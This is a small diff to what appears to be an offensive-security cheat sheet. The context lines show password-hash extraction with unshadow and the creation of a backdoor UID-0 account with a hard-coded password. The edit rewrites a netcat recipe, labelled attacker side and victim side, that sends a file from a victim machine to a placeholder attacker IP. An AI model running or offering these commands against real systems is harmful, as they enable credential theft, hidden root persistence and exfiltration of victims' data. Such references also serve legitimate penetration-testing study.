@@ -132,8 +132,11 @@ unshadow passwd.txt shadow.txt > passwords.txt
 sudo useradd -ou 0 -g 0 john | sudo passwd John@1234
 ```
 ```sh
-nc -lp 4444 < file
-nc <attacker ip> 4444 > file
+Attacker side:
+nc -l -p 4444 -q 1 > file < /dev/null
+
+Victim side:
+nc <attacker ip> 4444 < file
 ```
 ```sh
 python -m http.server
